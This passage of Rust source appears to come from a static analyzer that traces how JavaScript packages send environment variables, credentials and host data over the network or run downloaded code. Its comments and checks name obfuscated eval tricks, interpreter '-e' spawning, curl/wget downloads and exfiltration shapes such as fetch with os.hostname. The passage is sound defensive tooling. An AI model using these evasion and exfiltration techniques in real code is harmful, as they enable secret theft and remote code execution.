                    if a.kind(left) == Kind::BinaryExpression && a.operator(left) == "+" && seen < ALIAS_DEPTH {
                        n = left;
                        seen += 1;
                        continue;
                    }
                    return false;
                }
            }
            Kind::CallExpression => {
                // 'x'.concat(…), [a, b].join('.')
                let callee = a.unwrap(a.at(node, jt::A));
                a.kind(callee) == Kind::MemberExpression
                    && a.prop_name(callee).is_some_and(|n| eq(&n, "concat") || eq(&n, "join"))
            }
            Kind::Identifier if depth < 2 => {
                let b = match self.bind(node, scope) {
                    Some(b) => b,
                    None => return false,
                };
                let writes = self.p.binds[b as usize].writes.clone();
                writes.iter().any(|w| match w {
                    Write::Init { node, scope, path } | Write::Assign { node, scope, path } if path.is_empty() => {
                        self.p.binds[b as usize].module == self.m && self.sc_composed(*node, *scope, depth + 1)
                    }
                    _ => false,
                })
            }
            _ => false,
        }
    }

    /// A send: what reaches its arguments, by role.
    fn sc_send(&mut self, node: NodeId, spec: Spec, args: &[V], spread: isize, scope: ScopeId) {
        let at = self.a().0.nodes[node as usize].start;
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        let label = Rc::new(self.p.fns[self.fid as usize].label());
        for (i, v) in args.iter().enumerate() {
            let address = spec.addresses < 0 || (spec.addresses > 0 && (i as i8) < spec.addresses);
            if spec.composed {
                match arg_nodes.get(i) {
                    Some(&n) if self.sc_composed(n, scope, 0) => {}
                    _ => continue,
                }
            }
            let v = if spread >= 0 && i as isize >= spread { union_all(args.iter().skip(i)) } else { v.clone() };
            self.sc_reach(&v, if address { SEND_ADDR } else { SEND_DATA }, at, &label);
            if spread >= 0 && i as isize >= spread {
                break;
            }
        }
    }

    /// A value at a send's argument: the parameters it holds reach the send
    /// (the function's summary); local data in it is the finding.
    pub(super) fn sc_reach(&mut self, v: &V, cat: u8, at: u32, label: &Rc<PyStr>) {
        if !v.tainted() {
            return;
        }
        let entry: Entry = (self.m, at, label.clone(), false);
        for &key in v.params.iter() {
            self.reach_adds.push((key, cat, entry.clone()));
        }
        if v.src && self.emit {
            if let Some(sc) = &v.sc {
                self.sc_emit(sc, cat == SEND_ADDR, at);
            }
        }
    }

    /// A received-code sink given `v` at `at`: the parameters it holds reach
    /// it (the function's summary); data received over the network in it is
    /// the finding.
    pub(super) fn sc_sink(&mut self, cat: u8, v: &V, at: u32) {
        if !v.tainted() {
            return;
        }
        let label = Rc::new(self.p.fns[self.fid as usize].label());
        let entry: Entry = (self.m, at, label, false);
        for &key in v.params.iter() {
            self.reach_adds.push((key, cat, entry.clone()));
        }
        if v.src && self.emit && v.sc.as_ref().is_some_and(|s| s.kinds & K_RECEIVED != 0) {
            if let Some(name) = received_cat(cat) {
                self.findings.push(Out::Received { at, cat: name });
            }
        }
    }

    /// A string a node folds to: a literal, a template without holes, their
    /// `+` (`'ev' + 'al'`).
    fn sc_fold(&self, node: NodeId, depth: u32) -> Option<PyStr> {
        if let Some(s) = self.sc_const_str(node) {
            return Some(s);
        }
        let a = self.a();
        if a.kind(node) == Kind::BinaryExpression && a.operator(node) == "+" && depth < 16 {
            let (l, r) = (a.at(node, jt::A), a.at(node, jt::B));
            let mut out = self.sc_fold(l, depth + 1)?;
            out.extend(self.sc_fold(r, depth + 1)?);
            return Some(out);
        }
        None
    }

    /// Does an expression come from the function's caller: a parameter of
    /// a function around it, `this`, `arguments`, or what is made of them
    /// (`options.url`, `` `${this.baseUrl}/x` ``)?
    pub(super) fn sc_from_caller(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
        if depth > 16 || node == NONE {
            return false;
        }
        let kind = self.a().kind(node);
        let parts: Vec<NodeId> = match kind {
            Kind::ThisExpression => return true,
            Kind::Identifier => {
                if self.a().is_ident_named(node, "arguments") {
                    return true;
                }
                let b = match self.bind(node, scope) {
                    Some(b) => b,
                    None => return false,
                };
                let (module, writes) = {
                    let bind = &self.p.binds[b as usize];
                    (bind.module, bind.writes.clone())
                };
                if module != self.m {
                    return false;
                }
                if writes.iter().any(|w| matches!(w, Write::Param { .. })) {
                    return true;
                }
                // (a name given what comes from the caller)
                return writes.iter().take(8).any(|w| match w {
                    Write::Init { node: v, scope: s, .. } | Write::Assign { node: v, scope: s, .. } => {
                        self.sc_from_caller(*v, *s, depth + 1)
                    }
                    _ => false,
                });
            }
            Kind::MemberExpression => {
                let a = self.a();
                if a.computed(node) {
                    vec![a.at(node, jt::A), a.at(node, jt::B)]
                } else {
                    vec![a.at(node, jt::A)]
                }
            }
            Kind::TemplateLiteral => self.a().list(node, jt::B).to_vec(),
            Kind::BinaryExpression | Kind::LogicalExpression => vec![self.a().at(node, jt::A), self.a().at(node, jt::B)],
            Kind::ConditionalExpression => vec![self.a().at(node, jt::B), self.a().at(node, jt::C)],
            Kind::UnaryExpression | Kind::AwaitExpression | Kind::ChainExpression | Kind::SpreadElement => {
                vec![self.a().at(node, jt::A)]
            }
            Kind::ArrayExpression => self.a().list(node, jt::A).iter().copied().filter(|&e| e != NONE).collect(),
            Kind::ObjectExpression => {
                let props = self.a().list(node, jt::A).to_vec();
                props
                    .into_iter()
                    .map(|p| if self.a().kind(p) == Kind::Property { self.a().at(p, jt::B) } else { self.a().at(p, jt::A) })
                    .collect()
            }
            Kind::CallExpression | Kind::NewExpression => {
                let mut v = vec![self.a().at(node, jt::A)];
                v.extend(self.a().list(node, jt::B).iter().copied());
                v
            }
            _ => return false,
        };
        parts.into_iter().any(|p| !self.a().is_function(p) && self.sc_from_caller(p, scope, depth + 1))
    }

    /// Is a receiving call's address the script's own — what the script
    /// read or received (`fetch('https://…' + os.hostname())`, a dead drop's
    /// address), or anything its caller doesn't give it — rather than one a
    /// caller gives (a library's request for its user: `load(url)`,
    /// `request(options)`, `${this.baseUrl}`)? A server's and a socket's data
    /// are their own.
    fn sc_own_address(&mut self, node: NodeId, names: &[PyStr], member: bool, args: &[V], scope: ScopeId) -> bool {
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        let own = |me: &mut Self, i: usize| -> bool {
            match (arg_nodes.get(i), args.get(i)) {
                (Some(&n), Some(v)) => (v.src && v.params.is_empty()) || !me.sc_from_caller(n, scope, 0),
                (Some(&n), None) => !me.sc_from_caller(n, scope, 0),
                _ => false,
            }
        };
        // servers and sockets: what they are sent
        if names.iter().any(|n| {
            is_one(
                n,
                &[
                    "http.createServer", "https.createServer", "http2.createServer", "http2.createSecureServer",
                    "net.createServer", "tls.createServer", "dgram.createSocket",
                ],
            )
        }) {
            return true;
        }
        // a connection: (port, host) or (options); no host is this machine
        if names.iter().any(|n| is_one(n, &["net.connect", "net.createConnection", "tls.connect"])) {
            let first_is_obj = arg_nodes.first().is_some_and(|&n| self.a().kind(n) == Kind::ObjectExpression);
            if first_is_obj || arg_nodes.len() < 2 || self.a().is_function(arg_nodes[1]) {
                return own(self, 0);
            }
            return own(self, 1);
        }
        // axios(config), axios.request(config): its url
        if !member || names.iter().any(|n| eq(n, "axios.request")) {
            if names.iter().any(|n| eq(n, "axios") || eq(n, "axios.request")) {
                return own(self, 0);
            }
        }
        own(self, 0)
    }

    /// A call of the script's own downloader (its parameter `i` is a
    /// request's address: `const get = (u) => fetch(u)`), given the
    /// script's own address: what it returns is received.
    pub(super) fn sc_wrapper_receives(&mut self, node: NodeId, i: usize, t: &V) -> Option<V> {
        let arg = {
            let a = self.a();
            if !matches!(a.kind(node), Kind::CallExpression | Kind::NewExpression) {
                return None;
            }
            let args = a.list(node, jt::B);
            if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
                return None;
            }
            *args.get(i)?
        };
        let scope = self.cur;
        if !((t.src && t.params.is_empty()) || !self.sc_from_caller(arg, scope, 0)) {
            return None;
        }
        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
        Some(self.sc_source(K_RECEIVED, u("a download"), at, line, 0))
    }

    /// `process.env.NAME` (and `process.env['NAME']`): a binding the model
    /// keeps for what the script stores there.
    pub(super) fn sc_env_member(&mut self, member: NodeId, scope: ScopeId) -> Option<BindId> {
        let name = {
            let a = self.a();
            if a.kind(member) != Kind::MemberExpression {
                return None;
            }
            let obj = a.at(member, jt::A);
            let env = a.kind(obj) == Kind::MemberExpression
                && !a.computed(obj)
                && a.prop_name(obj).is_some_and(|n| eq(&n, "env"))
                && a.is_ident_named(a.at(obj, jt::A), "process");
            if !env {
                return None;
            }
            (a.prop_name(member)?, a.at(a.at(member, jt::A), jt::A))
        };
        if self.bind(name.1, scope).is_some() {
            return None;
        }
        let key = (4u8, self.m, name.0.clone());
        if let Some(&b) = self.p.sc_props.get(&key) {
            return Some(b);
        }
        let m = self.m;
        let bid = self.p.binds.len() as BindId;
        let fid = self.p.mods[m as usize].fn_;
        self.p.binds.push(Bind {
            bid,
            name: name.0,
            kind: BindKind::Var,
            fid,
            writes: Vec::new(),
            shared: true,
            module: m,
            refs: Vec::new(),
            targets: None,
        });
        self.p.sc_props.insert(key, bid);
        Some(bid)
    }

    /// The arguments of a call that are runners themselves (`eval`,
    /// `Function`, `vm.runInThisContext`, given as a callback): each runs
    /// what the call holds.
    fn sc_runner_args(&mut self, node: NodeId, held: &V, scope: ScopeId) {
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        for an in arg_nodes {
            let k = self.a().kind(an);
            if !matches!(k, Kind::Identifier | Kind::MemberExpression) {
                continue;
            }
            let on = self.sc_names(an, scope);
            if runs_of(&on).is_some_and(|r| r.cat == RUN_CODE) {
                let at = self.a().0.nodes[an as usize].start;
                self.sc_sink(RUN_CODE, held, at);
                return;
            }
        }
    }

    /// Does a call's command line begin with a fixed program that is not an
    /// interpreter given code (`_DL_EMBED_RE`): a template or a `+` whose
    /// first part is text?
    fn sc_fixed_program(&mut self, node: NodeId, scope: ScopeId) -> bool {
        let first = match self.a().list(node, jt::B).first() {
            Some(&f) => f,
            None => return false,
        };
        // (a name given the command line: what it was first given)
        let first = if self.a().kind(first) == Kind::Identifier {
            let init = self.bind(first, scope).and_then(|b| {
                let bind = &self.p.binds[b as usize];
                if bind.module != self.m {
                    return None;
                }
                bind.writes.iter().find_map(|w| match w {
                    Write::Init { node: v, path, .. } if path.is_empty() => Some(*v),
                    _ => None,
                })
            });
            match init {
                Some(v) => v,
                None => return false,
            }
        } else {
            first
        };
        let a = self.a();
        let mut lead = first;
        let mut seen = 0;
        while a.kind(lead) == Kind::BinaryExpression && a.operator(lead) == "+" && seen < 64 {
            lead = a.at(lead, jt::A);
            seen += 1;
        }
        let prefix: PyStr = match a.kind(lead) {
            Kind::TemplateLiteral => a.list(lead, jt::A).first().map(|&q| a.s(q, jt::A).to_vec()).unwrap_or_default(),
            _ if lead != first => match a.str_value(lead) {
                Some(s) => s.to_vec(),
                None => return false,
            },
            _ => return false,
        };
        if pystr::strip(&prefix).is_empty() {
            return false;
        }
        let n = &a.0.nodes[lead as usize];
        let sup = self.sup();
        sup.p().re("_DL_EMBED_RE").match_(sup.span(n.start, n.end)).is_none()
    }

    /// The received-code sink a call is, if any: by its callee's names, and
    /// by the forms names don't give (`m._compile(code)`, `eval.call(t,
    /// code)`, `eval.bind(t)(code)`, `o['ev' + 'al'](code)`,
    /// `[].constructor.constructor(code)`, an interpreter given `-e` and code).
    fn sc_runs(&mut self, node: NodeId, callee: NodeId, names: &[PyStr], scope: ScopeId) -> Option<Runs> {
        if let Some(r) = runs_of(names) {
            return Some(r);
        }
        // an interpreter given code: spawn('node', ['-e', code])
        const SPAWNS: &[&str] = &["spawn", "spawnSync", "execFile", "execFileSync"];
        if names.iter().any(|n| n.len() > 14 && eq(&n[..14], "child_process.") && is_one(&n[14..], SPAWNS)) && self.sc_interp(node) {
            return Some(Runs { cat: RUN_CODE, from: 1, rest: false });
        }
        let (kind, member) = {
            let a = self.a();
            (a.kind(callee), a.kind(callee) == Kind::MemberExpression)
        };
        // eval.bind(t)(code)
        if kind == Kind::CallExpression {
            let inner = self.a().unwrap(self.a().at(callee, jt::A));
            if self.a().kind(inner) == Kind::MemberExpression && self.a().prop_name(inner).is_some_and(|n| eq(&n, "bind")) {
                let obj = self.a().at(inner, jt::A);
                let on = self.sc_names(obj, scope);
                if runs_of(&on).is_some_and(|r| r.cat == RUN_CODE) {
                    return Some(Runs { cat: RUN_CODE, from: 0, rest: true });
                }
            }
            return None;
        }
        if !member {
            return None;
        }
        let (obj, name, computed) = {
            let a = self.a();
            (a.at(callee, jt::A), a.prop_name(callee), a.computed(callee))
        };
        let name = match name {
            Some(n) => n,
            None if computed => match self.sc_fold(self.a().at(callee, jt::B), 0) {
                Some(n) => n,
                None => return None,
            },
            None => return None,
        };
        let named = |n: &str| eq(&name, n);
        if named("_compile") || named("runInThisContext") || named("runInNewContext") || named("runInContext") || named("compileFunction") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
        }
        // o['eval'](code), o['Function'](code)
        if computed && named("eval") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
        }
        if computed && named("Function") {
            return Some(Runs { cat: RUN_CODE, from: 0, rest: true });
        }
        // eval.call(t, code), Function.apply(t, [code])
        if named("call") || named("apply") {
            let on = self.sc_names(obj, scope);
            if let Some(r) = runs_of(&on).filter(|r| r.cat == RUN_CODE) {
                return Some(Runs { cat: RUN_CODE, from: 1, rest: r.rest });
            }
        }
        // Function's own constructor: Object.constructor(code), x.constructor.constructor(code)
        if named("constructor") {
            let a = self.a();
            let ctor = (a.kind(obj) == Kind::Identifier && is_one(a.name(obj), CONSTRUCTORS))
                || (a.kind(obj) == Kind::MemberExpression && a.prop_name(obj).is_some_and(|n| eq(&n, "constructor")));
            if ctor {
                return Some(Runs { cat: RUN_CODE, from: 0, rest: true });
            }
        }
        if SPAWNS.iter().any(|s| named(s)) && self.sc_interp(node) {
            return Some(Runs { cat: RUN_CODE, from: 1, rest: false });
        }
        None
    }

    /// Is a call's first argument an interpreter, and its second a list
    /// that holds a flag making it run code (`_DL_INTERP`)?
    fn sc_interp(&self, node: NodeId) -> bool {
        let a = self.a();
        let args = a.list(node, jt::B);
        let (first, second) = match (args.first(), args.get(1)) {
            (Some(&f), Some(&s)) => (f, s),
            _ => return false,
        };
        let interp = match self.sc_const_str(first) {
            Some(s) => {
                let base = match s.iter().rposition(|&c| c == 0x2F || c == 0x5C) {
                    Some(k) => &s[k + 1..],
                    None => &s[..],
                };
                let base = if base.len() > 4 && eq(&base[base.len() - 4..], ".exe") { &base[..base.len() - 4] } else { base };
                is_one(base, INTERPRETERS) || (base.len() > 6 && eq(&base[..6], "python"))
            }
            None => {
                let n = &a.0.nodes[first as usize];
                let text = self.sup().span(n.start, n.end).to_vec();
                eq(&text, "process.execPath") || eq(&text, "process.argv[0]")
            }
        };
        interp
            && a.kind(second) == Kind::ArrayExpression
            && a.list(second, jt::A).iter().any(|&e| e != NONE && self.sc_const_str(e).is_some_and(|s| is_one(&s, EVAL_FLAGS)))
    }

    /// Is a call's first argument a command line that downloads (curl or
    /// wget first, `downloads`)? What it prints is received.
    fn sc_download(&self, node: NodeId) -> bool {
        let a = self.a();
        let first = match a.list(node, jt::B).first() {
            Some(&f) => f,
            None => return false,
        };
        let head = if a.kind(first) == Kind::ArrayExpression {
            match a.list(first, jt::A).first() {
                Some(&e) if e != NONE => e,
                _ => return false,
            }
        } else {
            first
        };
        let text: PyStr = match a.kind(head) {
            Kind::TemplateLiteral => a.list(head, jt::A).first().map(|&q| a.s(q, jt::A).to_vec()).unwrap_or_default(),
            _ => match a.str_value(head) {
                Some(s) => s.to_vec(),
                None => return false,
            },
        };
        // (the metadata test reads the argument's whole text: a template's holes too)
        let n = &a.0.nodes[first as usize];
        let sup = self.sup();
        let whole = sup.span(n.start, n.end);
        let mut both = text.clone();
        both.push(0x20);
        both.extend_from_slice(whole);
        downloads(sup.p(), &text) && downloads(sup.p(), &both)
    }

    /// A URL literal whose host the next part continues, joined with `v`:
    /// what is resolved in a host name is sent (the text follower's
    /// `_LD_HOST_BUILT_RE`).
    pub(super) fn sc_host_built(&mut self, lit: NodeId, v: &V) {
        if !v.tainted() {
            return;
        }
        let (prefix, at) = {
            let a = self.a();
            let text = match a.kind(lit) {
                Kind::Literal => a.str_value(lit).map(|s| s.to_vec()),
                Kind::TemplateLiteral => a.list(lit, jt::A).first().map(|&q| a.s(q, jt::A).to_vec()),
                _ => None,
            };
            (text.is_some_and(|t| host_prefix(&t)), a.0.nodes[lit as usize].start)
        };
        if prefix {
            let label = Rc::new(self.p.fns[self.fid as usize].label());
            self.sc_reach(v, SEND_DATA, at, &label);
        }
    }

    /// A call of the script's wrapper of exec (its parameter `i` is the
    /// command line): what the command prints, when the call gives it as a
    /// constant.
    pub(super) fn sc_wrapper_output(&self, node: NodeId, i: usize) -> Option<V> {
        let (arg, at, line) = {
            let a = self.a();
            let args = a.list(node, jt::B);
            let arg = *args.get(i)?;
            if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
                return None;
            }
            (arg, a.0.nodes[node as usize].start, self.call_line(node))
        };
        let command = self.sc_const_str(arg)?;
        let sup = self.sup();
        let p = sup.p();
        if p.re("_LD_METADATA_RE").search(&command).is_some() {
            return Some(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, line, 0));
        }
        if downloads(p, &command) {
            return Some(self.sc_source(K_RECEIVED, u("a download"), at, line, 0));
        }
        let (kind, what) = crate::shell::sh_output_data(p, &command, 0, None).into_iter().next()?;
        Some(self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, line, 0))
    }

    /// A call of the script's own reader (its parameter `i` is the path),
    /// given a path outside the package: what it reads; of the script's own
    /// `getEnv(name)`, given a constant name: that variable.
    pub(super) fn sc_wrapper_read(&self, node: NodeId, cat: u8, t: &V, i: usize) -> Option<V> {
        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
        if cat == READ_PATH {
            let sc = t.sc.as_ref()?;
            let (_, what, _) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PATH)?;
            return Some(self.sc_source(K_FILE, pystr::upto(what, 60).to_vec(), at, line, 0));
        }
        if cat == ENV_NAME {
            let arg = {
                let a = self.a();
                let args = a.list(node, jt::B);
                if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
                    return None;
                }
                *args.get(i)?
            };
            let name = self.sc_const_str(arg)?;
            let v = self.sc_env_var(&name, at, line);
            return if v.tainted() { Some(v) } else { None };
        }
        None
    }

    /// The finding for local data `sc` at a send.
    pub(super) fn sc_emit(&mut self, sc: &Sc, address: bool, at: u32) {
        // (a harvest first, then the first read)
        let pick = |strong_only: bool| {
            sc.firsts
                .iter()
                .filter(|(k, _, _)| (1u16 << k) & NOT_LOCAL == 0)
                .filter(|(k, _, _)| !strong_only || (1u16 << k) & STRONG_IN_ADDRESS != 0)
                .min_by_key(|(k, _, a)| ((1u16 << k) & HARVEST == 0, *a))
                .cloned()
        };
        let (chosen, in_address) = if !address {
            (pick(false), false)
        } else {
            match pick(true) {
                Some(c) => (Some(c), false),
                None => (pick(false), true),
            }
        };
        if let Some((k, what, _)) = chosen {
            self.findings.push(Out::Send { at, kind: KIND_NAMES[k as usize], what: (*what).clone(), in_address });
        }
    }

    /// The functions a call's arguments are (a callback, a function's name).
    fn sc_fn_args(&mut self, node: NodeId, scope: ScopeId) -> Vec<FnId> {
        let m = self.m;
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        let mut out = Vec::new();
        for an in arg_nodes {
            let k = self.a().kind(an);
            if self.a().is_function(an) {
                out.push(self.p.mods[m as usize].fid_at[an as usize]);
            } else if matches!(k, Kind::Identifier | Kind::MemberExpression) {
                for d in self.p.descs_of_expr(m, an, scope, 0) {
                    if let D::Fn(f) = d {
                        out.push(f);
                    }
                }
            }
        }
        dedupe(out)
    }

    /// Callbacks given a value: each parameter holds it (a read's callback
    /// gets what was read; a callback of anything else, what the call
    /// holds: its receiver and its other arguments). Their value.
    fn sc_callbacks(&mut self, node: NodeId, val: &V, scope: ScopeId) -> V {
        if !val.tainted() {
            return V::empty();
        }
        let fids = self.sc_fn_args(node, scope);
        if fids.is_empty() {
            return V::empty();
        }
        let line = self.call_line(node);
        let mut out = V::empty();
        for fid in fids {
            let n = self.p.fns[fid as usize].params.len().max(1);
            let cb_args = vec![val.plain(); n];
            out = out.union(&self.apply(node, &[fid], &cb_args, -1, line, false));
        }
        out
    }

    /// `this.x` in a method of a class or an object literal: the binding
    /// the model keeps for that member (made when first met), or None.
    pub(super) fn sc_this_member(&mut self, member: NodeId, scope: ScopeId) -> Option<BindId> {
        let (obj, name) = {
            let a = self.a();
            if a.kind(member) != Kind::MemberExpression || a.computed(member) {
                return None;
            }
            (a.at(member, jt::A), a.prop_name(member)?)
        };
        if self.a().kind(obj) != Kind::ThisExpression {
            return None;
        }
        let owner = self.p.this_descs(scope).into_iter().find_map(|d| match d {
            D::Inst(c) => Some((1u8, c)),
            D::Obj(o) => Some((2u8, o)),
            _ => None,
        })?;
        let key = (owner.0, owner.1, name.clone());
        if let Some(&b) = self.p.sc_props.get(&key) {
            return Some(b);
        }
        let m = self.m;
        let bid = self.p.binds.len() as BindId;
        let fid = self.p.mods[m as usize].fn_;
        self.p.binds.push(Bind {
            bid,
            name,
            kind: BindKind::Var,
            fid,
            writes: Vec::new(),
            shared: true,
            module: m,
            refs: Vec::new(),
            targets: None,
        });
        self.p.sc_props.insert(key, bid);
        Some(bid)
    }

    /// supply mode: a member's value, or None for the default reading.
    /// `key`: a computed member's key, its value.
    pub(super) fn sc_member(&mut self, node: NodeId, obj: &V, key: &V, scope: ScopeId) -> Option<V> {
        let (computed, name, objn, at, line) = {
            let a = self.a();
            let computed = a.computed(node);
            let line = if computed { a.line(node) } else { a.line(a.at(node, jt::B)) };
            (computed, a.prop_name(node), a.at(node, jt::A), a.0.nodes[node as usize].start, line)
        };
        // process.env
        if name.as_deref().is_some_and(|n| eq(n, "env")) && self.a().is_ident_named(objn, "process") && self.bind(objn, scope).is_none() {
            let whole = self.sup().whole.clone();
            return Some(self.sc_source(K_WHOLE_ENV, whole, at, line, OBJ_ENV));
        }
        // one of its variables; by a name it computes: every variable when
        // the name comes from the environment itself (a copy of it), the
        // variable a caller names (`getEnv(name)`), else none
        if obj.kind & OBJ_ENV != 0 {
            return Some(match name {
                Some(n) => {
                    let stored = match self.sc_env_member(node, scope) {
                        Some(b) => self.read(b),
                        None => V::empty(),
                    };
                    self.sc_env_var(&n, at, line).union(&stored)
                }
                None => {
                    if key.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
                        obj.plain()
                    } else {
                        if !key.params.is_empty() {
                            let label = Rc::new(self.p.fns[self.fid as usize].label());
                            let entry: Entry = (self.m, at, label, false);
                            for &k in key.params.iter() {
                                self.reach_adds.push((k, ENV_NAME, entry.clone()));
                            }
                        }
                        V::empty()
                    }
                }
            });
        }
        // a function that reads local data, as a value: `tryGet(os.hostname)`
        if let Some(n) = &name {
            if !computed && self.sc_reader_name(n) {
                let m = self.m;
                let names: Vec<PyStr> = self
                    .p
                    .descs_of_expr(m, node, scope, 0)
                    .into_iter()
                    .filter_map(|d| if let D::Builtin(b) = d { Some(b) } else { None })
                    .collect();
                if let Some(v) = self.sc_module_source(&names, at, line) {
                    return Some(v);
                }
            }
        }
        // a member of `this`
        if !computed {
            if let Some(b) = self.sc_this_member(node, scope) {
                return Some(self.read(b));
            }
        }
        None
    }

    /// supply mode: a call (sources, sends, connections, clients,
    /// callbacks). Its value.
    pub(super) fn sc_call(&mut self, node: NodeId, recv: &V, callee_val: &V, args: &[V], spread: isize, scope: ScopeId) -> R<V> {
        let callee = self.a().unwrap(self.a().at(node, jt::A));
        let member = self.a().kind(callee) == Kind::MemberExpression;
        let name: Option<PyStr> = if member {
            self.a().prop_name(callee)
        } else if self.a().is_ident(callee) {
            Some(self.a().name(callee).to_vec())
        } else {
            None
        };
        let named = |n: &str| name.as_deref().is_some_and(|x| eq(x, n));
        let names = self.sc_names(callee, scope);
        // received code: code run, a module's name loaded, data deserialized
        if let Some(r) = self.sc_runs(node, callee, &names, scope) {
            let at = self.a().0.nodes[node as usize].start;
            let v = if spread >= 0 && spread as usize <= r.from {
                union_all(args.iter().skip(spread as usize))
            } else if r.rest {
                union_all(args.iter().skip(r.from))
            } else {
                args.get(r.from).cloned().unwrap_or_else(V::empty)
            };
            // (a command line that runs a fixed program given the data as
            // its argument runs no code it receives: `exec('curl … ' + data)`;
            // an interpreter given it as code does: `exec('node -e ' + code)`)
            let shell = names
                .iter()
                .any(|n| is_one(n, &["child_process.exec", "child_process.execSync", "shelljs.exec", "execSync", "exec"]));
            if !(shell && self.sc_fixed_program(node, scope)) {
                self.sc_sink(r.cat, &v, at);
            }
        }
        // a read of local data: its value, and its callbacks get it
        if let Some(src) = self.sc_source_call(node, &names, args, scope) {
            let cb = self.sc_callbacks(node, &src, scope);
            return Ok(src.union(&cb.plain()));
        }
        // sends
        let mut spec = send_spec(&names);
        if spec.is_none() && callee_val.kind & OBJ_CLIENT != 0 && !member {
            spec = Some(SEND1);
        }
        if spec.is_none() && member && recv.kind & OBJ_CLIENT != 0 {
            if named("post") || named("put") || named("patch") {
                spec = Some(SEND1);
            } else if named("request") {
                spec = Some(REQUEST2);
            } else if named("get") {
                spec = Some(ADDRESS);
            }
        }
        if spec.is_none() && member && recv.kind & OBJ_CONN != 0 && name.as_deref().is_some_and(|n| is_one(n, CONN_WRITES)) {
            spec = Some(OPTIONS);
        }
        if spec.is_none() && name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES)) {
            // a network program run with data on its command line
            let sup = self.sup();
            let a = self.a();
            let list = a.list(node, jt::B);
            if let (Some(&f), Some(&l)) = (list.first(), list.last()) {
                let text = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
                if sup.p().re("_LD_NET_PROGRAM_RE").search(text).is_some() {
                    spec = Some(OPTIONS);
                }
            }
        }
        if let Some(spec) = spec {
            self.sc_send(node, spec, args, spread, scope);
        }
        // what the call receives (a response, a connection's data, what a
        // server is sent): its value, and what its callbacks are given
        // (from the script's own address: what a library requests for its
        // caller is not the script's download)
        let receiving = receives(&names)
            || (member && recv.kind & OBJ_CLIENT != 0 && name.as_deref().is_some_and(|n| is_one(n, CLIENT_CALLS)))
            || (!member && callee_val.kind & OBJ_CLIENT != 0);
        let got = if receiving && self.sc_own_address(node, &names, member, args, scope) {
            let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
            let what = names.first().cloned().unwrap_or_else(|| u("a request"));
            self.sc_source(K_RECEIVED, what, at, line, 0)
        } else {
            V::empty()
        };
        // the script's own wrapper of exec: its parameter is the command line
        if name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES)) && self.sc_command_line(node).is_none() {
            if let Some(first) = args.first() {
                if !first.params.is_empty() {
                    let at = self.a().0.nodes[node as usize].start;
                    let label = Rc::new(self.p.fns[self.fid as usize].label());
                    let entry: Entry = (self.m, at, label, false);
                    for &key in first.params.iter() {
                        self.reach_adds.push((key, EXEC_CMD, entry.clone()));
                    }
                }
            }
        }
        // `src.pipe(connection)`: what the stream holds is sent
        if member && named("pipe") && args.iter().any(|a| a.kind & OBJ_CONN != 0) {
            let at = self.a().0.nodes[node as usize].start;
            let label = Rc::new(self.p.fns[self.fid as usize].label());
            self.sc_reach(&recv.plain(), SEND_DATA, at, &label);
        }
        // a selection of the environment's variables (`Object.entries(process.env)
        // .filter(([k]) => k.startsWith('X_'))`) is not the whole of it, unless
        // the test excludes some or names secrets (the text follower's _LD_ENV_SELECT_RE)
        if member && named("filter") && recv.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
            let sup = self.sup();
            let a = self.a();
            let list = a.list(node, jt::B);
            if let (Some(&f), Some(&l)) = (list.first(), list.last()) {
                let cond = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
                let p = sup.p();
                if p.re("_LD_EXCLUDES_RE").search(cond).is_none() && p.re("_SH_SECRET_VAR_RE").search(cond).is_none() {
                    return Ok(V::empty());
                }
            }
        }
        // a number or a flag: not the data; a child process: not what it
        // was given (what it prints is local data only for a command known
        // to print some: sc_source_call)
        if names.iter().any(|n| is_one(n, NUMERIC)) || (member && named("byteLength")) {
            return Ok(V::empty());
        }
        let child = names.iter().any(|n| {
            n.len() > 14 && eq(&n[..14], "child_process.")
        }) || name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES) || is_one(n, &["spawn", "fork"]));
        if child {
            // a download's output is received: its value, and what its
            // callbacks are given (after its command line is read as a send)
            if name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES)) && self.sc_download(node) {
                let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
                let src = self.sc_source(K_RECEIVED, u("a download"), at, line, 0);
                let cb = self.sc_callbacks(node, &src, scope);
                self.sc_runner_args(node, &src, scope);
                return Ok(src.union(&cb.plain()));
            }
            // (its callbacks still run: an exec's callback gets nothing local)
            let tg = self.p.call_targets(self.m, node, scope);
            if !tg.0.is_empty() {
                let line = self.call_line(node);
                return Ok(self.apply(node, &tg.0.clone(), args, spread, line, false));
            }
            return Ok(V::empty());
        }
        // the functions it reaches, as in project mode
        let tg = self.p.call_targets(self.m, node, scope);
        let (fids, how) = (tg.0.clone(), tg.1);
        let definite = how == descs::How::Definite;
        let line = self.call_line(node);
        let mut v;
        if !fids.is_empty() {
            v = self.apply(node, &fids, args, spread, line, false);
            if !definite {
                let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                v = v.union(&union_all(&plains)).union(&recv.plain());
            }
        } else if name.as_deref().is_some_and(|n| is_in(CLEAN_RESULT, n)) {
            v = V::empty();
        } else if receiving {
            // (a response holds what was received, not what was sent)
            v = V::empty();
        } else {
